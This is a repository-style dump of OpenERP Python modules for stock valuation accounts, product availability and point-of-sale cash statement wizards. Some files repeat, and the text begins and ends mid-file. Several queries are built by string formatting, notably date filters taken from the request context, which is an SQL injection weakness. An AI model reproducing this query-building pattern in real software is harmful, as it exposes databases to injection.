            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),
        'property_stock_account_output': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Output Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),
    }

product_template()

class product_category(osv.osv):

    _inherit = 'product.category'
    _columns = {
        'property_stock_journal': fields.property('account.journal',
            relation='account.journal', type='many2one',
            string='Stock journal', method=True, view_load=True,
            help="When doing real-time inventory valuation, this is the Accounting Journal in which entries will be automatically posted when stock moves are processed."),
        'property_stock_account_input_categ': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Input Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),
        'property_stock_account_output_categ': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Output Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),
        'property_stock_variation': fields.property('account.account',
            type='many2one',
            relation='account.account',
            string="Stock Variation Account",
            method=True, view_load=True,
            help="When real-time inventory valuation is enabled on a product, this account will hold the current value of the products.",),
    }

product_category()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _

class pos_close_statement(osv.osv_memory):
    _name = 'pos.close.statement'
    _description = 'Close Statements'

    def close_statement(self, cr, uid, ids, context):
        """
             Close the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Dictionary
        """
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        statement_obj = self.pool.get('account.bank.statement')
        journal_obj = self.pool.get('account.journal')
        cr.execute("""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id"""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute(""" select id from account_journal                    
                            where auto_cash='True' and type='cash'                    
                            and id in (%s)""" %(','.join(map(lambda x: "'" + str(x) + "'", j_ids))))                    
        journal_ids = map(lambda x1: x1[0], cr.fetchall())                    

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if not ids:
                raise osv.except_osv(_('Message'), _('Journals are already closed'))
            else:
                list_statement.append(ids[0])
                if not journal.check_dtls:
                    statement_obj.button_confirm_cash(cr, uid, ids, context)
    #        if not list_statement:
    #            return {}
    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)
    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']

        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id
        return {
                'domain': "[('id','in'," + str(list_statement) + ")]",
                'name': 'Close Statements',
                'view_type': 'form',
                'view_mode': 'tree,form',
                'res_model': 'account.bank.statement',
                'views': [(id2, 'tree'),(id3, 'form')],
                'type': 'ir.actions.act_window'}

pos_close_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _
import time

class pos_open_statement(osv.osv_memory):
    _name = 'pos.open.statement'
    _description = 'Open Statements'

    def open_statement(self, cr, uid, ids, context):
        """
             Open the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Directory
        """
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        statement_obj = self.pool.get('account.bank.statement')
        sequence_obj = self.pool.get('ir.sequence')
        journal_obj = self.pool.get('account.journal')
        cr.execute("""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id"""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute(""" select id from account_journal                    
                            where auto_cash='True' and type='cash'                    
                            and id in (%s)""" %(','.join(map(lambda x: "'" + str(x) + "'", j_ids))))                    
        journal_ids = map(lambda x1: x1[0], cr.fetchall())                    

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if len(ids):
                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for "%s". \n Please close the cashbox related to. ' %(journal.name)))
            
#            cr.execute(""" Select id from account_bank_statement
#                                    where journal_id =%d
#                                    and company_id =%d
#                                    order by id desc limit 1""" %(journal.id, company_id))
#            st_id = cr.fetchone()
            
            number = ''
            if journal.sequence_id:
                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)
            else:
                number = sequence_obj.get(cr, uid, 'account.bank.statement')
            
            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,
                                                          'company_id': company_id,
                                                          'user_id': uid,
                                                          'state': 'open',
                                                          'name': number,
                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),
                                                      })
            statement_obj.button_open(cr, uid, [statement_id], context)

    #            period = statement_obj._get_period(cr, uid, context) or None
    #            cr.execute("INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))
    #            cr.commit()
    #            cr.execute("select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'"%(journal.id, company_id, uid, number))
    #            statement_id = cr.fetchone()[0]
    #            print "statement_id",statement_id
    #            if st_id:
    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])
    #                list_statement.append(statemt_id.id)
    #                if statemt_id and statemt_id.ending_details_ids:
    #                    statement_obj.write(cr, uid, [statement_id], {
    #                        'balance_start': statemt_id.balance_end,
    #                        'state': 'open',
    #                    })
    #                    if statemt_id.ending_details_ids:
    #                        for i in statemt_id.ending_details_ids:
    #                            c = statement_obj.create(cr, uid, {
    #                                'pieces': i.pieces,
    #                                'number': i.number,
    #                                'starting_id': statement_id,
    #                            })
        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id

        return {
#           'domain': "[('id','in', ["+','.join(map(str,list_statement))+"])]",
            'domain': "[('state','=','open')]",
            'name': 'Open Statement',
            'view_type': 'form',
            'view_mode': 'tree,form',
            'res_model': 'account.bank.statement',
            'views': [(id2, 'tree'),(id3, 'form')],
            'type': 'ir.actions.act_window'
}
pos_open_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import fields, osv
from tools.translate import _

class product_product(osv.osv):
    _inherit = "product.product"

    def get_product_accounts(self, cr, uid, product_id, context=None):
        """ To get the stock input account, stock output account and stock journal related to product.
        @param product_id: product id
        @return: dictionary which contains information regarding stock input account, stock output account and stock journal
        """
        if context is None:
            context = {}
        product_obj = self.pool.get('product.product').browse(cr, uid, product_id, context=context)

        stock_input_acc = product_obj.property_stock_account_input and product_obj.property_stock_account_input.id or False
        if not stock_input_acc:
            stock_input_acc = product_obj.categ_id.property_stock_account_input_categ and product_obj.categ_id.property_stock_account_input_categ.id or False

        stock_output_acc = product_obj.property_stock_account_output and product_obj.property_stock_account_output.id or False
        if not stock_output_acc:
            stock_output_acc = product_obj.categ_id.property_stock_account_output_categ and product_obj.categ_id.property_stock_account_output_categ.id or False

        journal_id = product_obj.categ_id.property_stock_journal and product_obj.categ_id.property_stock_journal.id or False
        account_variation = product_obj.categ_id.property_stock_variation and product_obj.categ_id.property_stock_variation.id or False

        return {
            'stock_account_input': stock_input_acc,
            'stock_account_output': stock_output_acc,
            'stock_journal': journal_id,
            'property_stock_variation': account_variation
        }

    def do_change_standard_price(self, cr, uid, ids, datas, context={}):
        """ Changes the Standard Price of Product and creates an account move accordingly.
        @param datas : dict. contain default datas like new_price, stock_output_account, stock_input_account, stock_journal
        @param context: A standard dictionary
        @return:

        """
        location_obj = self.pool.get('stock.location')
        move_obj = self.pool.get('account.move')
        move_line_obj = self.pool.get('account.move.line')

        new_price = datas.get('new_price', 0.0)
        stock_output_acc = datas.get('stock_output_account', False)
        stock_input_acc = datas.get('stock_input_account', False)
        journal_id = datas.get('stock_journal', False)
        product_obj=self.browse(cr,uid,ids)[0]
        account_variation = product_obj.categ_id.property_stock_variation
        account_variation_id = account_variation and account_variation.id or False
        if not account_variation_id: raise osv.except_osv(_('Error!'), _('Variation Account is not specified for Product Category: %s' % (product_obj.categ_id.name)))
        move_ids = []
        loc_ids = location_obj.search(cr, uid,[('usage','=','internal')])
        for rec_id in ids:
            for location in location_obj.browse(cr, uid, loc_ids):
                c = context.copy()
                c.update({
                    'location': location.id,
                    'compute_child': False
                })

                product = self.browse(cr, uid, rec_id, context=c)
                qty = product.qty_available
                diff = product.standard_price - new_price
                if not diff: raise osv.except_osv(_('Error!'), _("Could not find any difference between standard price and new price!"))
                if qty:
                    company_id = location.company_id and location.company_id.id or False
                    if not company_id: raise osv.except_osv(_('Error!'), _('Company is not specified in Location'))
                    #
                    # Accounting Entries
                    #
                    if not journal_id:
                        journal_id = product.categ_id.property_stock_journal and product.categ_id.property_stock_journal.id or False
                    if not journal_id:
                        raise osv.except_osv(_('Error!'),
                            _('There is no journal defined '\
                                'on the product category: "%s" (id: %d)') % \
                                (product.categ_id.name,
                                    product.categ_id.id,))
                    move_id = move_obj.create(cr, uid, {
                                'journal_id': journal_id,
                                'company_id': company_id
                                })

                    move_ids.append(move_id)


                    if diff > 0:
                        if not stock_input_acc:
                            stock_input_acc = product.product_tmpl_id.\
                                property_stock_account_input.id
                        if not stock_input_acc:
                            stock_input_acc = product.categ_id.\
                                    property_stock_account_input_categ.id
                        if not stock_input_acc:
                            raise osv.except_osv(_('Error!'),
                                    _('There is no stock input account defined ' \
                                            'for this product: "%s" (id: %d)') % \
                                            (product.name,
                                                product.id,))
                        amount_diff = qty * diff
                        move_line_obj.create(cr, uid, {
                                    'name': product.name,
                                    'account_id': stock_input_acc,
                                    'debit': amount_diff,
                                    'move_id': move_id,
                                    })
                        move_line_obj.create(cr, uid, {
                                    'name': product.categ_id.name,
                                    'account_id': account_variation_id,
                                    'credit': amount_diff,
                                    'move_id': move_id
                                    })
                    elif diff < 0:
                        if not stock_output_acc:
                            stock_output_acc = product.product_tmpl_id.\
                                property_stock_account_output.id
                        if not stock_output_acc:
                            stock_output_acc = product.categ_id.\
                                    property_stock_account_output_categ.id
                        if not stock_output_acc:
                            raise osv.except_osv(_('Error!'),
                                    _('There is no stock output account defined ' \
                                            'for this product: "%s" (id: %d)') % \
                                            (product.name,
                                                product.id,))
                        amount_diff = qty * -diff
                        move_line_obj.create(cr, uid, {
                                        'name': product.name,
                                        'account_id': stock_output_acc,
                                        'credit': amount_diff,
                                        'move_id': move_id
                                    })
                        move_line_obj.create(cr, uid, {
                                        'name': product.categ_id.name,
                                        'account_id': account_variation_id,
                                        'debit': amount_diff,
                                        'move_id': move_id
                                    })

            self.write(cr, uid, rec_id, {'standard_price': new_price})

        return move_ids

    def view_header_get(self, cr, user, view_id, view_type, context=None):
        if context is None:
            context = {}
        res = super(product_product, self).view_header_get(cr, user, view_id, view_type, context)
        if res: return res
        if (context.get('active_id', False)) and (context.get('active_model') == 'stock.location'):
            return _('Products: ')+self.pool.get('stock.location').browse(cr, user, context['active_id'], context).name
        return res

    def get_product_available(self, cr, uid, ids, context=None):
        """ Finds whether product is available or not in particular warehouse.
        @return: Dictionary of values
        """
        if context is None:
            context = {}
        states = context.get('states',[])
        what = context.get('what',())
        if not ids:
            ids = self.search(cr, uid, [])
        res = {}.fromkeys(ids, 0.0)
        if not ids:
            return res

        if context.get('shop', False):
            cr.execute('select warehouse_id from sale_shop where id=%s', (int(context['shop']),))
            res2 = cr.fetchone()
            if res2:
                context['warehouse'] = res2[0]

        if context.get('warehouse', False):
            cr.execute('select lot_stock_id from stock_warehouse where id=%s', (int(context['warehouse']),))
            res2 = cr.fetchone()
            if res2:
                context['location'] = res2[0]

        if context.get('location', False):
            if type(context['location']) == type(1):
                location_ids = [context['location']]
            elif type(context['location']) in (type(''), type(u'')):
                location_ids = self.pool.get('stock.location').search(cr, uid, [('name','ilike',context['location'])], context=context)
            else:
                location_ids = context['location']
        else:
            location_ids = []
            wids = self.pool.get('stock.warehouse').search(cr, uid, [], context=context)
            for w in self.pool.get('stock.warehouse').browse(cr, uid, wids, context=context):
                location_ids.append(w.lot_stock_id.id)

        # build the list of ids of children of the location given by id
        if context.get('compute_child',True):
            child_location_ids = self.pool.get('stock.location').search(cr, uid, [('location_id', 'child_of', location_ids)])
            location_ids = child_location_ids or location_ids
        else:
            location_ids = location_ids

        uoms_o = {}
        product2uom = {}
        for product in self.browse(cr, uid, ids, context=context):
            product2uom[product.id] = product.uom_id.id
            uoms_o[product.uom_id.id] = product.uom_id

        results = []
        results2 = []

        from_date=context.get('from_date',False)                    
        to_date=context.get('to_date',False)                    
        date_str=False                    
        if from_date and to_date:
            date_str="date_planned>='%s' and date_planned<='%s'"%(from_date,to_date)                    
        elif from_date:
            date_str="date_planned>='%s'"%(from_date)                    
        elif to_date:
            date_str="date_planned<='%s'"%(to_date)                    

        if 'in' in what:
            # all moves from a location out of the set to a location in the set
            cr.execute(
                'select sum(product_qty), product_id, product_uom '\
                'from stock_move '\
                'where location_id NOT IN %s'\
                'and location_dest_id IN %s'\
                'and product_id IN %s'\
                'and state IN %s' + (date_str and 'and '+date_str+' ' or '') +''\
                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)                    
            )
            results = cr.fetchall()
        if 'out' in what:
            # all moves from a location in the set to a location out of the set
            cr.execute(
                'select sum(product_qty), product_id, product_uom '\
                'from stock_move '\
                'where location_id IN %s'\
                'and location_dest_id NOT IN %s '\
                'and product_id  IN %s'\
                'and state in %s' + (date_str and 'and '+date_str+' ' or '') + ''\
                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)                    
            )
            results2 = cr.fetchall()
        uom_obj = self.pool.get('product.uom')
        uoms = map(lambda x: x[2], results) + map(lambda x: x[2], results2)
        if context.get('uom', False):
            uoms += [context['uom']]

        uoms = filter(lambda x: x not in uoms_o.keys(), uoms)
        if uoms:
            uoms = uom_obj.browse(cr, uid, list(set(uoms)), context=context)
        for o in uoms:
            uoms_o[o.id] = o
        for amount, prod_id, prod_uom in results:
            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,
                    uoms_o[context.get('uom', False) or product2uom[prod_id]])
            res[prod_id] += amount
        for amount, prod_id, prod_uom in results2:
            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,
                    uoms_o[context.get('uom', False) or product2uom[prod_id]])
            res[prod_id] -= amount
        return res

    def _product_available(self, cr, uid, ids, field_names=None, arg=False, context=None):
        """ Finds the incoming and outgoing quantity of product.
        @return: Dictionary of values
        """
        if not field_names:
            field_names = []
        if context is None:
            context = {}
        res = {}
        for id in ids:
            res[id] = {}.fromkeys(field_names, 0.0)
        for f in field_names:
            c = context.copy()
            if f == 'qty_available':
                c.update({ 'states': ('done',), 'what': ('in', 'out') })
            if f == 'virtual_available':
                c.update({ 'states': ('confirmed','waiting','assigned','done'), 'what': ('in', 'out') })
            if f == 'incoming_qty':
                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('in',) })
            if f == 'outgoing_qty':
                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('out',) })
            stock = self.get_product_available(cr, uid, ids, context=c)
            for id in ids:
                res[id][f] = stock.get(id, 0.0)
        return res

    _columns = {
        'qty_available': fields.function(_product_available, method=True, type='float', string='Real Stock', help="Current quantities of products in selected locations or all internal if none have been selected.", multi='qty_available'),
        'virtual_available': fields.function(_product_available, method=True, type='float', string='Virtual Stock', help="Future stock for this product according to the selected locations or all internal if none have been selected. Computed as: Real Stock - Outgoing + Incoming.", multi='qty_available'),
        'incoming_qty': fields.function(_product_available, method=True, type='float', string='Incoming', help="Quantities of products that are planned to arrive in selected locations or all internal if none have been selected.", multi='qty_available'),
        'outgoing_qty': fields.function(_product_available, method=True, type='float', string='Outgoing', help="Quantities of products that are planned to leave in selected locations or all internal if none have been selected.", multi='qty_available'),
        'track_production': fields.boolean('Track Manufacturing Lots' , help="Forces to specify a Production Lot for all moves containing this product and generated by a Manufacturing Order"),
        'track_incoming': fields.boolean('Track Incoming Lots', help="Forces to specify a Production Lot for all moves containing this product and coming from a Supplier Location"),
        'track_outgoing': fields.boolean('Track Outgoing Lots', help="Forces to specify a Production Lot for all moves containing this product and going to a Customer Location"),
        'location_id': fields.dummy(string='Stock Location', relation='stock.location', type='many2one'),
        'valuation':fields.selection([('manual_periodic', 'Periodical (manual)'),
                                        ('real_time','Real Time (automated)'),], 'Inventory Valuation', 
                                        help="If real-time valuation is enabled for a product, the system will automatically write journal entries corresponding to stock moves." \
                                             "The inventory variation account set on the product category will represent the current inventory value, and the stock input and stock output account will hold the counterpart moves for incoming and outgoing products."
                                        , required=True),
    }

    _defaults = {
        'valuation': lambda *a: 'manual_periodic',
    }

    def fields_view_get(self, cr, uid, view_id=None, view_type='form', context=None, toolbar=False, submenu=False):
        res = super(product_product,self).fields_view_get(cr, uid, view_id, view_type, context, toolbar=toolbar, submenu=submenu)
        if context is None:
            context = {}
        if ('location' in context) and context['location']:
            location_info = self.pool.get('stock.location').browse(cr, uid, context['location'])
            fields=res.get('fields',{})
            if fields:
                if location_info.usage == 'supplier':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Receptions')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Received Qty')

                if location_info.usage == 'internal':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Stock')

                if location_info.usage == 'customer':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Deliveries')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Delivered Qty')

                if location_info.usage == 'inventory':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future P&L')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('P&L Qty')

                if location_info.usage == 'procurement':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Qty')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Unplanned Qty')

                if location_info.usage == 'production':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Productions')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Produced Qty')
        return res

product_product()

class product_template(osv.osv):
    _name = 'product.template'
    _inherit = 'product.template'
    _columns = {
        'property_stock_procurement': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string="Procurement Location",
            method=True,
            view_load=True,
            domain=[('usage','like','procurement')],
            help="For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by procurements"),
        'property_stock_production': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string="Production Location",
            method=True,
            view_load=True,
            domain=[('usage','like','production')],
            help="For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by production orders"),
        'property_stock_inventory': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string="Inventory Location",
            method=True,
            view_load=True,
            domain=[('usage','like','inventory')],
            help="For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated when you do an inventory"),
        'property_stock_account_input': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Input Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),
        'property_stock_account_output': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Output Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),
    }

product_template()

class product_category(osv.osv):

    _inherit = 'product.category'
    _columns = {
        'property_stock_journal': fields.property('account.journal',
            relation='account.journal', type='many2one',
            string='Stock journal', method=True, view_load=True,
            help="When doing real-time inventory valuation, this is the Accounting Journal in which entries will be automatically posted when stock moves are processed."),
        'property_stock_account_input_categ': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Input Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),
        'property_stock_account_output_categ': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Output Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),
        'property_stock_variation': fields.property('account.account',
            type='many2one',
            relation='account.account',
            string="Stock Variation Account",
            method=True, view_load=True,
            help="When real-time inventory valuation is enabled on a product, this account will hold the current value of the products.",),
    }

product_category()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _

class pos_close_statement(osv.osv_memory):
    _name = 'pos.close.statement'
    _description = 'Close Statements'

    def close_statement(self, cr, uid, ids, context):
        """
             Close the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Dictionary
        """
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        statement_obj = self.pool.get('account.bank.statement')
        journal_obj = self.pool.get('account.journal')
        cr.execute("""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id"""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute(""" select id from account_journal                    
                            where auto_cash='True' and type='cash'                    
                            and id in (%s)""" %(','.join(map(lambda x: "'" + str(x) + "'", j_ids))))                    
        journal_ids = map(lambda x1: x1[0], cr.fetchall())                    

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if not ids:
                raise osv.except_osv(_('Message'), _('Journals are already closed'))
            else:
                list_statement.append(ids[0])
                if not journal.check_dtls:
                    statement_obj.button_confirm_cash(cr, uid, ids, context)
    #        if not list_statement:
    #            return {}
    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)
    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']

        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id
        return {
                'domain': "[('id','in'," + str(list_statement) + ")]",
                'name': 'Close Statements',
                'view_type': 'form',
                'view_mode': 'tree,form',
                'res_model': 'account.bank.statement',
                'views': [(id2, 'tree'),(id3, 'form')],
                'type': 'ir.actions.act_window'}

pos_close_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _
import time

class pos_open_statement(osv.osv_memory):
    _name = 'pos.open.statement'
    _description = 'Open Statements'

    def open_statement(self, cr, uid, ids, context):
        """
             Open the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Directory
        """
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        statement_obj = self.pool.get('account.bank.statement')
        sequence_obj = self.pool.get('ir.sequence')
        journal_obj = self.pool.get('account.journal')
        cr.execute("""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id"""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute(""" select id from account_journal                    
                            where auto_cash='True' and type='cash'                    
                            and id in (%s)""" %(','.join(map(lambda x: "'" + str(x) + "'", j_ids))))                    
        journal_ids = map(lambda x1: x1[0], cr.fetchall())                    

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if len(ids):
                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for "%s". \n Please close the cashbox related to. ' %(journal.name)))
            
#            cr.execute(""" Select id from account_bank_statement
#                                    where journal_id =%d
#                                    and company_id =%d
#                                    order by id desc limit 1""" %(journal.id, company_id))
#            st_id = cr.fetchone()
            
            number = ''
            if journal.sequence_id:
                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)
            else:
                number = sequence_obj.get(cr, uid, 'account.bank.statement')
            
            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,
                                                          'company_id': company_id,
                                                          'user_id': uid,
                                                          'state': 'open',
                                                          'name': number,
                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),
                                                      })
            statement_obj.button_open(cr, uid, [statement_id], context)

    #            period = statement_obj._get_period(cr, uid, context) or None
    #            cr.execute("INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))
    #            cr.commit()
    #            cr.execute("select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'"%(journal.id, company_id, uid, number))
